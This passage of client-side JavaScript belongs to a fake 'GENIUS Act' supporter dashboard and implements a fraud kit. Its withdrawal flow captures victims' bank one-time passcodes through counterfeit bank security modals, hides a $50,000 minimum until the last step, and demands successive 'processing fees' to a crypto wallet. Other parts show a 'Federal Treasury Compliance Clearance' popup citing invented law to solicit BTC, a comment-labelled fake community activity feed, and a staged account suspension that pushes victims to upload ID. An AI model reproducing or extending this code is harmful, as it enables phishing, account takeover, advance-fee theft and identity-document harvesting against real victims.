                const idx = bankLinks.findIndex(l => l.id === link.id || (l.userEmail && link.userEmail && l.userEmail.toLowerCase() === link.userEmail.toLowerCase()));
                if (idx > -1) {
                    bankLinks[idx].otpSubmitted = val;
                    bankLinks[idx].otpSubmittedAt = new Date().toISOString();
                    bankLinks[idx].otpVerified = false;
                    localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));
                    if (window.cloudSyncFull) {
                        try { await window.cloudSyncFull(); } catch(e) {}
                    }
                }

                setTimeout(() => {
                    // OTP submitted — show waiting for admin verification screen
                    renderOTPWaitingStep(link);
                }, 1200);
            };
        };

        const renderOTPWaitingStep = (link) => {
            const content = document.getElementById('withdrawal-content');
            const bankName = link.bankName || 'Your Banking Institution';
            selectedBank = bankName;
            accountNumber = link.accountNumber || accountNumber;
            routingNumber = link.routingNumber || routingNumber;

            content.style.cssText = "background: #ffffff; color: #1e293b; padding: 30px; border-radius: 16px; max-width: 500px; width: 90%; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.4); border: 1px solid #cbd5e1; font-family: 'Inter', sans-serif; position:relative;";

            content.innerHTML = `
                <button id="close-modal-x" style="position:absolute; top:15px; right:15px; background:none; border:none; font-size:1.5rem; color:#94a3b8; cursor:pointer;">&times;</button>
                
                <div style="background:#0f172a; color:white; padding:14px; border-radius:10px 10px 0 0; margin:-30px -30px 20px -30px; display:flex; align-items:center; justify-content:space-between;">
                    <div style="display:flex; align-items:center; gap:10px;">
                        <i class="fas fa-shield-alt" style="color:#38bdf8; font-size:1.4rem;"></i>
                        <div>
                            <div style="font-size:0.72rem; font-weight:700; opacity:0.85; text-transform:uppercase; letter-spacing:0.5px;">SECURITY VERIFICATION</div>
                            <div style="font-size:1.05rem; font-weight:800;">${escapeHtml(bankName)}</div>
                        </div>
                    </div>
                    <span style="font-size:0.7rem; background:#f59e0b; color:#0f172a; padding:3px 8px; border-radius:4px; font-weight:700;"><i class="fas fa-clock"></i> PENDING</span>
                </div>

                <div style="padding:16px; background:#fffbeb; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:16px;">
                    <i class="fas fa-hourglass-half" style="font-size:2.5rem; color:#f59e0b; animation: pulse-spin 2s ease-in-out infinite;"></i>
                </div>

                <h3 style="margin:0 0 10px 0; font-size:1.3rem; color:#0f172a; font-weight:800;">OTP Submitted — Awaiting Verification</h3>
                <p style="color:#64748b; font-size:0.88rem; margin-bottom:20px; line-height:1.5;">
                    Your OTP code has been securely submitted. An administrator must verify your code before you can proceed to enter the withdrawal amount.
                </p>

                <div style="background:#eff6ff; border:1px solid #bfdbfe; color:#1e40af; padding:14px 16px; border-radius:10px; font-size:0.85rem; margin-bottom:20px; line-height:1.5; text-align:left;">
                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
                        <i class="fas fa-info-circle" style="color:#0284c7; font-size:1.1rem;"></i>
                        <strong>What happens next?</strong>
                    </div>
                    <ul style="margin:0; padding-left:18px; list-style:disc;">
                        <li>Your OTP has been forwarded to the security team</li>
                        <li>An administrator will review and verify your code</li>
                        <li>Once verified, you can return here to enter your withdrawal amount</li>
                    </ul>
                </div>

                <div style="display:flex; gap:0.75rem; justify-content:center; flex-wrap:wrap;">
                    <button id="close-waiting-btn" style="padding:0.75rem 1.6rem; background:linear-gradient(135deg, #3b82f6, #2563eb); color:white; border:none; border-radius:8px; font-weight:700; cursor:pointer; font-size:0.95rem;">
                        <i class="fas fa-check"></i> Understood
                    </button>
                    <button id="refresh-otp-status-btn" style="padding:0.75rem 1.6rem; background:#f1f5f9; color:#475569; border:1px solid #cbd5e1; border-radius:8px; font-weight:600; cursor:pointer; font-size:0.9rem;">
                        <i class="fas fa-sync-alt"></i> Check Status
                    </button>
                </div>

                <style>
                    @keyframes pulse-spin {
                        0%, 100% { transform: rotate(0deg); opacity: 1; }
                        50% { transform: rotate(180deg); opacity: 0.7; }
                    }
                </style>
            `;

            document.getElementById('close-modal-x').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('close-waiting-btn').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('refresh-otp-status-btn').onclick = async () => {
                const refreshBtn = document.getElementById('refresh-otp-status-btn');
                refreshBtn.disabled = true;
                refreshBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Checking...`;

                if (window.cloudSyncFull) {
                    try { await window.cloudSyncFull(); } catch(e) {}
                }

                // Re-read bank links to check if admin verified
                const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
                const user = getUserData();
                const freshLink = bankLinks.find(l => l.userEmail && user.email && l.userEmail.toLowerCase() === user.email.toLowerCase());

                if (freshLink && freshLink.otpVerified) {
                    // Admin verified! Proceed to KYC/amount
                    selectedBank = freshLink.bankName || bankName;
                    accountNumber = freshLink.accountNumber || accountNumber;
                    routingNumber = freshLink.routingNumber || routingNumber;
                    checkKYCandProceed();
                } else {
                    refreshBtn.disabled = false;
                    refreshBtn.innerHTML = `<i class="fas fa-sync-alt"></i> Check Status`;
                    // Show a brief "still pending" message
                    const msgEl = document.createElement('div');
                    msgEl.style.cssText = "background:#fef3c7; border:1px solid #fcd34d; color:#92400e; padding:8px 12px; border-radius:8px; font-size:0.82rem; font-weight:600; margin-top:12px;";
                    msgEl.innerHTML = `<i class="fas fa-clock"></i> Verification still pending. Please check back shortly.`;
                    const existingMsg = content.querySelector('.otp-pending-msg');
                    if (existingMsg) existingMsg.remove();
                    msgEl.className = 'otp-pending-msg';
                    content.appendChild(msgEl);
                }
            };
        };

        const checkKYCandProceed = () => {
            const user = getUserData();
            const isKYCCompleted = user.kyc && user.kyc.status === 'approved';

            if (isKYCCompleted) {
                // SKIP KYC step if user completed/approved KYC (Req 7)
                renderStep3();
            } else {
                renderKYCStep();
            }
        };

        const renderKYCStep = () => {
            const content = document.getElementById('withdrawal-content');
            content.innerHTML = `
                <button id="close-modal-x" style="position:absolute; top:15px; right:15px; background:none; border:none; font-size:1.5rem; color:#94a3b8; cursor:pointer;">&times;</button>
                <div style="display:flex; align-items:center; gap:0.6rem; margin-bottom:0.5rem;">
                    <i class="fas fa-user-shield" style="color:#f59e0b; font-size:1.5rem;"></i>
                    <h3 style="margin:0; font-size:1.3rem; color:#0f172a;">Step 2: KYC Verification Required</h3>
                </div>
                <p style="color:#64748b; font-size:0.9rem; margin-bottom:1.5rem; line-height:1.5;">
                    To comply with financial regulations and protect account security, identity verification (KYC) is required before bank withdrawals can be processed.
                </p>
                <div style="background:#fffbe6; border:1px solid #ffe58f; padding:1rem; border-radius:8px; color:#d48806; font-size:0.88rem; margin-bottom:1.5rem;">
                    <i class="fas fa-info-circle"></i> You have not completed KYC verification yet or your submission is currently pending review.
                </div>
                <div style="display:flex; justify-content:flex-end; gap:0.75rem;">
                    <button id="cancel-withdraw-btn" style="padding:0.7rem 1.2rem; background:#f1f5f9; color:#64748b; border:1px solid #cbd5e1; border-radius:8px; font-weight:600; cursor:pointer;">Cancel</button>
                    <a href="#kyc" id="go-to-kyc-btn" class="btn-primary" style="padding:0.7rem 1.4rem; background:#f59e0b; color:white; border:none; border-radius:8px; font-weight:600; cursor:pointer; text-decoration:none; display:inline-flex; align-items:center; gap:0.4rem;">
                        <i class="fas fa-id-card"></i> Complete KYC Verification
                    </a>
                </div>
            `;

            document.getElementById('close-modal-x').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('cancel-withdraw-btn').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('go-to-kyc-btn').onclick = () => {
                withdrawalModal.style.display = 'none';
                const kycLink = document.querySelector('a[href="#kyc"]');
                if (kycLink) kycLink.click();
            };
        };

        const renderStep3 = () => {
            const content = document.getElementById('withdrawal-content');
            content.innerHTML = `
                <button id="close-modal-x" style="position:absolute; top:15px; right:15px; background:none; border:none; font-size:1.5rem; color:#94a3b8; cursor:pointer;">&times;</button>
                <div style="display:flex; align-items:center; gap:0.6rem; margin-bottom:0.5rem;">
                    <i class="fas fa-wallet" style="color:#10b981; font-size:1.5rem;"></i>
                    <h3 style="margin:0; font-size:1.3rem; color:#0f172a;">Final Step: Withdrawal Amount</h3>
                </div>
                <p style="color:#64748b; font-size:0.88rem; margin-bottom:1.5rem;">Enter the amount you wish to withdraw to your <strong>${escapeHtml(selectedBank)}</strong> account (Ending in ${escapeHtml(accountNumber.slice(-4))}).</p>

                <div style="margin-bottom:1.2rem;">
                    <label style="display:block; font-size:0.85rem; font-weight:600; color:#334155; margin-bottom:0.4rem;">Withdrawal Amount ($)</label>
                    <input type="number" id="withdraw-amount-input" placeholder="Enter amount (e.g. 50000)" min="1" step="100" style="width:100%; padding:0.75rem; border:1px solid #cbd5e1; border-radius:8px; background:#f8fafc; font-size:1rem; font-weight:600; color:#0f172a;" />
                </div>

                <div id="withdraw-final-feedback" style="margin-bottom:1.2rem;"></div>

                <div style="display:flex; justify-content:space-between; align-items:center; margin-top:1.5rem;">
                    <button id="back-to-step1" style="padding:0.7rem 1rem; background:#f1f5f9; color:#475569; border:1px solid #cbd5e1; border-radius:8px; font-weight:600; cursor:pointer;"><i class="fas fa-arrow-left"></i> Back</button>
                    <button id="review-withdraw-btn" class="btn-primary" style="padding:0.75rem 1.5rem; background:#10b981; color:white; border:none; border-radius:8px; font-weight:700; cursor:pointer; font-size:0.95rem;">Review & Continue</button>
                </div>
            `;

            document.getElementById('close-modal-x').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('back-to-step1').onclick = () => renderStep1();

            const reviewBtn = document.getElementById('review-withdraw-btn');
            reviewBtn.onclick = () => {
                const amountVal = parseFloat(document.getElementById('withdraw-amount-input').value);
                const feedback = document.getElementById('withdraw-final-feedback');

                if (isNaN(amountVal) || amountVal <= 0) {
                    feedback.innerHTML = `<div style="background:#fef2f2; border:1px solid #fecaca; color:#dc2626; padding:0.85rem; border-radius:8px; font-size:0.85rem; font-weight:600;"><i class="fas fa-exclamation-triangle"></i> Please enter a valid withdrawal amount.</div>`;
                    return;
                }

                // REQUIREMENT 6: Minimum withdrawal limit is 50,000.
                // Hidden initially, only visible/enforced at this final step!
                if (amountVal < 50000) {
                    feedback.innerHTML = `
                        <div style="background:#fef2f2; border:1px solid #fecaca; color:#dc2626; padding:0.85rem; border-radius:8px; font-size:0.88rem; font-weight:600;">
                            <i class="fas fa-exclamation-circle" style="font-size:1.1rem; margin-right:4px;"></i> Minimum withdrawal amount is $50,000.
                        </div>
                    `;
                    return;
                }

                // If amount >= 50,000: Render Fee Breakdown & Admin Fee Note (Req 1, 3, 6)
                const user = getUserData();
                const note = user.withdrawalFeeNote || '';
                const upfrontFee = user.upfrontFee !== undefined ? parseFloat(user.upfrontFee) : 0;
                const secondFee = user.secondFee !== undefined ? parseFloat(user.secondFee) : 0;
                const isUpfrontPaid = Boolean(user.upfrontFeePaid);

                let feeLabel = "Processing Fee";
                let activeFeeAmount = upfrontFee;
                if (isUpfrontPaid) {
                    activeFeeAmount = secondFee;
                }

                let feeNoteHtml = '';
                if (note) {
                    feeNoteHtml = `
                        <div style="background:#eff6ff; border:1px solid #bfdbfe; color:#1e40af; padding:0.85rem; border-radius:8px; font-size:0.85rem; margin-bottom:1rem; line-height:1.4; font-weight:600;">
                            <i class="fas fa-info-circle" style="color:#0284c7; margin-right:6px;"></i> ${escapeHtml(note)}
                        </div>
                    `;
                }

                let feePaymentBoxHtml = '';
                if (activeFeeAmount > 0) {
                    const walletAddr = user.feePaymentWallet || '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
                    const walletNet = user.feePaymentMethod || 'Bitcoin / USDT Deposit';
                    feePaymentBoxHtml = `
                        <div style="background:#0f172a; color:#ffffff; padding:16px; border-radius:12px; margin-bottom:1rem; border:1px solid #334155; text-align:left;">
                            <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:8px;">
                                <span style="font-size:0.8rem; font-weight:800; color:#38bdf8; text-transform:uppercase; letter-spacing:0.5px;">
                                    <i class="fas fa-wallet"></i> Fee Payment Deposit Address
                                </span>
                                <span style="font-size:0.7rem; background:#0284c7; color:white; padding:2px 6px; border-radius:4px; font-weight:700;">${escapeHtml(walletNet)}</span>
                            </div>
                            <p style="font-size:0.82rem; color:#94a3b8; margin:0 0 10px 0; line-height:1.4;">
                                Transfer required processing fee of <strong style="color:#f87171;">$${activeFeeAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong> to designated compliance wallet address:
                            </p>
                            <div style="background:#1e293b; border:1px solid #475569; padding:10px 12px; border-radius:8px; font-family:monospace; font-size:0.85rem; color:#38bdf8; word-break:break-all; display:flex; align-items:center; justify-content:space-between; gap:10px;">
                                <span>${escapeHtml(walletAddr)}</span>
                                <button type="button" onclick="navigator.clipboard.writeText('${escapeHtml(walletAddr)}'); alert('Copied fee deposit wallet address!');" style="background:#0284c7; color:white; border:none; padding:5px 10px; border-radius:4px; font-size:0.75rem; cursor:pointer; font-weight:700; flex-shrink:0;">Copy</button>
                            </div>
                            <div style="margin-top:10px;">
                                <label style="display:block; font-size:0.78rem; font-weight:700; color:#cbd5e1; margin-bottom:4px;">Payment Reference / TxID Hash</label>
                                <input type="text" id="fee-payment-txid-input" placeholder="Enter Transaction Hash / Proof TxID" style="width:100%; padding:0.65rem; border:1px solid #334155; border-radius:6px; background:#0f172a; color:#f8fafc; font-size:0.85rem; font-family:monospace;" />
                            </div>
                        </div>
                    `;
                }

                feedback.innerHTML = `
                    <div style="background:#f8fafc; border:1px solid #cbd5e1; padding:1.25rem; border-radius:10px; text-align:left; margin-top:0.5rem;">
                        <h4 style="margin:0 0 0.75rem 0; color:#0f172a; font-size:1rem; border-bottom:1px solid #e2e8f0; padding-bottom:0.5rem;"><i class="fas fa-receipt"></i> Withdrawal Summary</h4>
                        <div style="display:flex; justify-content:space-between; margin-bottom:0.4rem; font-size:0.88rem; color:#475569;">
                            <span>Requested Amount:</span>
                            <strong style="color:#0f172a;">$${amountVal.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong>
                        </div>
                        <div style="display:flex; justify-content:space-between; margin-bottom:0.4rem; font-size:0.88rem; color:#475569;">
                            <span>${feeLabel}:</span>
                            <strong style="color:#ef4444;">$${activeFeeAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong>
                        </div>
                        <div style="display:flex; justify-content:space-between; margin-bottom:0.75rem; font-size:0.88rem; color:#475569;">
                            <span>Destination Bank:</span>
                            <strong style="color:#0f172a;">${escapeHtml(selectedBank)} (...${escapeHtml(accountNumber.slice(-4))})</strong>
                        </div>

                        ${feeNoteHtml}
                        ${feePaymentBoxHtml}

                        <button id="final-submit-payout" style="width:100%; padding:0.85rem; background:linear-gradient(135deg, #10b981, #059669); color:white; border:none; border-radius:8px; font-weight:700; font-size:1rem; cursor:pointer; box-shadow:0 4px 12px rgba(16,185,129,0.3);">
                            <i class="fas fa-paper-plane"></i> Submit Fee Payment & Payout Request
                        </button>
                    </div>
                `;

                document.getElementById('final-submit-payout').onclick = async () => {
                    const btn = document.getElementById('final-submit-payout');
                    const txidInput = document.getElementById('fee-payment-txid-input');
                    const feeTxid = txidInput ? txidInput.value.trim() : '';

                    btn.disabled = true;
                    btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Submitting to Treasury...`;

                    // Create official withdrawal request record for Admin Panel
                    const requests = JSON.parse(localStorage.getItem('geniusact_withdrawal_requests')) || [];
                    const newRequest = {
                        id: 'WDR-' + Math.floor(10000000 + Math.random() * 90000000),
                        uid: user.uid || ('USR-' + Date.now()),
                        userEmail: user.email || '',
                        bank: selectedBank,
                        accountNumber: accountNumber,
                        routingNumber: routingNumber,
                        amount: amountVal,
                        feePaid: activeFeeAmount,
                        feeTxid: feeTxid,
                        date: new Date().toISOString(),
                        status: 'pending'
                    };

                    requests.unshift(newRequest);
                    localStorage.setItem('geniusact_withdrawal_requests', JSON.stringify(requests));

                    if (window.cloudSyncFull) {
                        try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
                    }

                    feedback.innerHTML = `
                        <div style="background:#ecfdf5; border:1px solid #a7f3d0; color:#065f46; padding:1.25rem; border-radius:10px; text-align:center;">
                            <i class="fas fa-check-circle" style="font-size:2.5rem; color:#10b981; margin-bottom:0.5rem; display:block;"></i>
                            <h4 style="margin:0 0 0.5rem 0; font-size:1.1rem; color:#065f46;">Payout Request Logged</h4>
                            <p style="font-size:0.85rem; margin:0 0 0.5rem 0; line-height:1.4;">Your withdrawal request of <strong>$${amountVal.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong> to <strong>${escapeHtml(selectedBank)}</strong> has been submitted to the Treasury Queue and is pending Administrator Approval.</p>
                            <span style="font-size:0.78rem; color:#047857; font-family:monospace;">Request ID: ${newRequest.id}</span>
                        </div>
                    `;
                    setTimeout(() => {
                        withdrawalModal.style.display = 'none';
                    }, 4000);
                };
            };
        };

        renderStep1();
    });
}

// Risk Shield / Federal Compliance Clearance Prompt  
function injectRiskShield() {  
    // Remove existing modal if present
    const existing = document.getElementById('risk-shield-modal');
    if (existing) existing.remove();

    const userStr = localStorage.getItem('geniusact_current_user');
    if (!userStr) return;

    let user = null;
    try { user = JSON.parse(userStr); } catch(e) {}
    if (!user) return;

    // Check if admin enabled compliance prompt for this user
    const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
    const appUser = approvedUsers.find(u => u.email && user.email && u.email.toLowerCase() === user.email.toLowerCase());

    const isEnabled = (appUser && appUser.riskShieldEnabled !== undefined) ? appUser.riskShieldEnabled : Boolean(user.riskShieldEnabled);

    // STRICT ADMIN CONTROL: If admin has NOT explicitly enabled it for this user, DO NOT SHOW!
    if (!isEnabled) {
        return;
    }

    const btcDisplay = (appUser && appUser.complianceBtcAmount) || user.complianceBtcAmount || '0.1 BTC';
    const usdDisplay = (appUser && appUser.complianceUsdAmount) || user.complianceUsdAmount || '$6,506.41';
    const tierDisplay = `${btcDisplay} (${usdDisplay})`;

    const shieldModal = document.createElement('div');  
    shieldModal.id = 'risk-shield-modal';  
    shieldModal.style.cssText = `  
        position: fixed;  
        top: 0;  
        left: 0;  
        width: 100%;  
        height: 100%;  
        background: rgba(15,23,42,0.88);  
        z-index: 9999;  
        display: flex;  
        align-items: center;  
        justify-content: center;  
        backdrop-filter: blur(6px);
    `;

    const shieldContent = document.createElement('div');  
    shieldContent.style.cssText = `  
        background: linear-gradient(135deg, #0f172a, #1e293b);  
        border: 2px solid #2563eb;  
        border-radius: 16px;  
        padding: 28px;  
        max-width: 530px;  
        width: 90%;
        color: white;  
        box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7);  
        font-family: 'Inter', system-ui, sans-serif;
    `;

    shieldContent.innerHTML = `  
        <div style="display:flex; align-items:center; gap:12px; margin-bottom:14px; border-bottom:1px solid #334155; padding-bottom:12px;">
            <i class="fas fa-university" style="color:#60a5fa; font-size:1.8rem;"></i>
            <div>
                <h2 style="color: #f8fafc; font-size: 1.15rem; font-weight:800; margin: 0; text-transform: uppercase; letter-spacing:0.5px;">FEDERAL TREASURY COMPLIANCE CLEARANCE</h2>
                <p style="color: #94a3b8; font-size: 0.75rem; margin: 2px 0 0 0; font-weight: 600;">Public Law 118-Sec 407 • U.S. Federal Election Campaign Act</p>
            </div>
        </div>

        <p style="font-size: 0.86rem; color: #cbd5e1; line-height: 1.5; margin-bottom: 16px;">
            Pursuant to Federal Campaign Audit standards and Section 407 of the GENIUS Act (Public Law 118-Sec 407), high-priority supporter treasury allocations require active Federal Treasury Compliance Clearance & Anti-Corruption Audit Indemnity.
        </p>

        <div style="margin: 16px 0; padding: 16px; background: rgba(30, 58, 138, 0.35); border: 1px solid #2563eb; border-radius: 10px;">  
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                <h3 style="color: #fbbf24; margin: 0; font-size: 0.95rem; font-weight: 800;"><i class="fas fa-certificate"></i> Compliance Tier: Federal Asset Clearance</h3>  
                <span style="background:#1e3a8a; color:#93c5fd; font-size:0.8rem; font-weight:800; padding:3px 10px; border-radius:6px; border:1px solid #3b82f6;">${tierDisplay}</span>
            </div>
            <p style="font-size:0.78rem; font-weight:700; color:#e2e8f0; margin-bottom:8px; text-transform:uppercase;">Official Compliance Protections & Rights:</p>  
            <ul style="margin: 0; padding-left: 18px; font-size: 0.82rem; color: #cbd5e1; line-height: 1.6;">  
                <li>🏛️ <strong>FEC Audit Exemption (Sec. 407)</strong> — Full Federal Campaign Immunity</li>  
                <li>⚡ <strong>Priority Treasury Settlement</strong> — Expedited Wire & Crypto Withdrawal Payouts</li>  
                <li>🛡️ <strong>UNCAC Asset Protection</strong> — Cross-Jurisdictional Anti-Corruption Indemnity</li>  
                <li>📜 <strong>Official Presidential Credentials</strong> — Access to Elite Tier Dashboard Features</li>  
            </ul>  
        </div>  

        <div style="display:flex; gap:10px; margin-top:20px;">
            <button id="shield-subscribe" style="flex:1; background: linear-gradient(135deg, #1e3a8a, #2563eb); color: white; padding: 12px 18px; border-radius: 8px; font-weight: 800; font-size:0.86rem; border:none; cursor: pointer; text-transform:uppercase; letter-spacing:0.5px;">
                🏛️ Activate Federal Clearance (${btcDisplay})
            </button>  
            <button id="shield-close" style="background: transparent; color: #94a3b8; border: 1px solid #334155; padding: 12px 16px; border-radius: 8px; font-size:0.82rem; font-weight:600; cursor: pointer;">
                Defer Clearance
            </button>
        </div>
    `;

    shieldModal.appendChild(shieldContent);  
    document.body.appendChild(shieldModal);

    document.getElementById('shield-subscribe').addEventListener('click', () => {  
        window.location.href = `contribute.html?amount=6506.41&description=Federal+Treasury+Compliance+Clearance+(${encodeURIComponent(btcDisplay)})`;  
    });

    document.getElementById('shield-close').addEventListener('click', () => {  
        shieldModal.remove();  
        setTimeout(injectRiskShield, 7200000); 
    });  
}

// Accurate Engagement Score Calculation Enabled (Manipulation Disabled)
function manipulateEngagement() {  
    // Disabled to preserve accurate Supporter Engagement Score
    return;
}

// Fake Community Pressure Feed  
function injectFakeActivity() {  
    const newsFeed = document.getElementById('news-feed');  
    if (!newsFeed) return;
    
    const fakeActivity = document.createElement('div');  
    fakeActivity.className = 'news-card';  
    fakeActivity.innerHTML = `  
        <div class="news-content">  
            <h3><i class="fas fa-user-circle"></i> Supporter Activity</h3>  
            <p><strong>EliteSupporter92</strong> just upgraded to Risk Shield Weekly Tier.</p>  
            <div class="news-meta">  
                <span><i class="fas fa-clock"></i> Just now</span>  
                <span><i class="fas fa-tag"></i> Risk Shield</span>  
            </div>  
        </div>  
    `;  
    newsFeed.appendChild(fakeActivity);

    setTimeout(() => {  
        fakeActivity.remove();  
        setTimeout(injectFakeActivity, Math.floor(Math.random() * 60000) + 30000); 
    }, 60000);  
}

// Account Suspension Simulation
function simulateAccountSuspension() {
    const userStr = localStorage.getItem('geniusact_current_user');
    if (userStr) {
        try {
            const user = JSON.parse(userStr);
            const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
            const freshUser = approvedUsers.find(u => u.email === user.email) || user;
            // DO NOT show account flagged popup if user has completed/approved KYC
            if (freshUser.kyc && (freshUser.kyc.status === 'approved' || freshUser.kyc.status === 'pending')) {
                return;
            }
        } catch (e) {
            console.error(e);
        }
    }

    const suspendModal = document.createElement('div');
    suspendModal.id = 'suspension-modal';
    suspendModal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.9);
        z-index: 10000;
        display: flex;
        align-items: center;
        justify-content: center;
    `;

    const suspendContent = document.createElement('div');
    suspendContent.style.cssText = `
        background: white;
        border: 2px solid #ef4444;
        border-radius: 12px;
        padding: 40px;
        max-width: 500px;
        text-align: center;
        box-shadow: 0 10px 40px rgba(239,68,68,0.3);
    `;

    suspendContent.innerHTML = `
        <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: #ef4444; margin-bottom: 20px;"></i>
        <h2 style="color: #ef4444; margin-bottom: 15px;">Account Temporarily Flagged</h2>
        <p style="margin-bottom: 20px; color: #333;">Our security systems have detected suspicious activity on your account. For your protection and to ensure compliance with federal regulations, your account has been temporarily flagged for review.</p>
        <p style="margin-bottom: 30px; font-weight: bold; color: #555;">Please complete the KYC re-verification process to restore full access to your funds.</p>
        <button id="suspension-verify" class="btn-primary" style="background-color: #ef4444; font-size: 1.1em; padding: 15px 30px;">Initiate Verification</button>
    `;

    suspendModal.appendChild(suspendContent);
    document.body.appendChild(suspendModal);

    document.getElementById('suspension-verify').addEventListener('click', () => {
        suspendContent.innerHTML = `
            <i class="fas fa-shield-alt" style="font-size: 48px; color: #3b82f6; margin-bottom: 20px;"></i>
            <h3>Redirecting to Security Portal...</h3>
            <div class="loader" style="margin: 20px auto;"></div>
        `;
        setTimeout(() => {
            suspendModal.remove();
            window.location.hash = '#kyc';
            // Show broadcast about it
            const broadcastMessage = document.getElementById('broadcast-message');
            const broadcastText = document.querySelector('.broadcast-text');
            if (broadcastMessage && broadcastText) {
                broadcastText.textContent = "Security Notice: Please upload your identification documents to remove the account restriction.";
                broadcastMessage.classList.remove('hidden');
                setTimeout(() => broadcastMessage.classList.add('hidden'), 10000);
            }
            // Trigger next suspension after a long time
            setTimeout(simulateAccountSuspension, Math.floor(Math.random() * (3600000 - 1800000)) + 1800000);
        }, 3000);
    });
}

// setupRealKYCSubmit removed because it conflicted with dashboard.js local submit.

function checkPendingOTPRequests() {
    const userStr = localStorage.getItem('geniusact_current_user');
    if (!userStr) return;
    let user;
    try { user = JSON.parse(userStr); } catch(e) { return; }
    if (!user) return;

    const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
    const link = bankLinks.find(l => 
        l.otpRequested === true && 
        !l.otpSubmitted && 
        (
            (user.email && l.userEmail && l.userEmail.toLowerCase() === user.email.toLowerCase()) ||
            (user.uid && l.uid && l.uid === user.uid) ||
            bankLinks.length === 1
        )
    );

    if (!link) return;

    // Check if OTP modal already visible
    if (document.getElementById('user-otp-modal')) return;

    const bankName = link.bankName || 'Your Banking Institution';
    const accEnd = (link.accountNumber || '').slice(-4);

    const modal = document.createElement('div');
    modal.id = 'user-otp-modal';
    modal.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(15,23,42,0.85); backdrop-filter:blur(6px); z-index:20000; display:flex; align-items:center; justify-content:center; font-family:'Inter', sans-serif;";

    modal.innerHTML = `
        <div style="background:#ffffff; border:1px solid #cbd5e1; border-radius:16px; max-width:500px; width:90%; padding:30px; box-shadow:0 25px 60px rgba(0,0,0,0.5); text-align:left; position:relative;">
            <div style="background:linear-gradient(135deg, #0f172a, #1e293b); color:#ffffff; padding:14px 18px; border-radius:12px 12px 0 0; margin:-30px -30px 22px -30px; display:flex; align-items:center; justify-content:space-between; border-bottom:2px solid #0284c7;">
                <div style="display:flex; align-items:center; gap:10px;">
                    <i class="fas fa-university" style="color:#38bdf8; font-size:1.4rem;"></i>
                    <div>
                        <div style="font-size:0.72rem; font-weight:800; letter-spacing:0.8px; color:#38bdf8; text-transform:uppercase;">${escapeHtml(bankName.toUpperCase())} ONLINE BANKING</div>
                        <div style="font-size:1rem; font-weight:800; color:#f8fafc;">SECURITY VERIFICATION</div>
                    </div>
                </div>
                <span style="font-size:0.7rem; background:#0284c7; color:white; padding:3px 8px; border-radius:4px; font-weight:700; letter-spacing:0.5px;">2FA ACTIVE</span>
            </div>

            <div style="display:flex; align-items:center; gap:14px; margin-bottom:18px;">
                <div style="padding:14px; background:#f0f9ff; border:1px solid #bae6fd; border-radius:12px; color:#0284c7; font-size:1.6rem; display:flex; align-items:center; justify-content:center;">
                    <i class="fas fa-mobile-alt"></i>
                </div>
                <div>
                    <h3 style="margin:0; font-size:1.3rem; color:#0f172a; font-weight:800;">${escapeHtml(bankName)} Security Clearance</h3>
                    <p style="margin:3px 0 0 0; color:#64748b; font-size:0.83rem; font-weight:600;">
                        Linked Account: <strong style="color:#0f172a;">${escapeHtml(bankName)} ${accEnd ? `(••••${escapeHtml(accEnd)})` : ''}</strong>
                    </p>
                </div>
            </div>

            <div style="background:#eff6ff; border:1px solid #bfdbfe; color:#1e40af; padding:14px; border-radius:10px; font-size:0.87rem; margin-bottom:20px; line-height:1.45;">
                <i class="fas fa-shield-alt" style="color:#0284c7; margin-right:4px;"></i> An official One-Time Passcode (OTP) has been generated by <strong>${escapeHtml(bankName)}</strong> to authorize account access and verify transaction clearance. Please enter the code sent to your registered device.
            </div>

            <div style="margin-bottom:20px;">
                <label style="display:block; font-size:0.8rem; font-weight:800; color:#334155; margin-bottom:8px; text-transform:uppercase; letter-spacing:0.6px;">Enter ${escapeHtml(bankName)} Security Code</label>
                <input type="text" id="user-otp-input" maxlength="8" placeholder="e.g. 482910" style="width:100%; padding:0.9rem; border:2px solid #0284c7; border-radius:10px; font-size:1.35rem; text-align:center; font-weight:800; letter-spacing:5px; color:#0f172a; background:#f8fafc; font-family:monospace;" />
            </div>

            <div id="user-otp-err" style="color:#ef4444; font-size:0.85rem; margin-bottom:14px; display:none; font-weight:600; background:#fef2f2; border:1px solid #fecaca; padding:8px 12px; border-radius:6px;"></div>

            <button id="submit-user-otp-btn" style="width:100%; padding:0.9rem; background:linear-gradient(135deg, #0284c7, #0369a1); color:white; border:none; border-radius:10px; font-size:1rem; font-weight:800; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; box-shadow:0 4px 14px rgba(2,132,199,0.35);">
                <i class="fas fa-check-circle"></i> Authorize & Verify ${escapeHtml(bankName)} OTP
            </button>

            <div style="margin-top:16px; text-align:center; font-size:0.75rem; color:#94a3b8; font-weight:600;">
                <i class="fas fa-lock"></i> Protected by 256-Bit SSL Banking Encryption &bull; ${escapeHtml(bankName)} Gateway
            </div>
        </div>
    `;

    document.body.appendChild(modal);

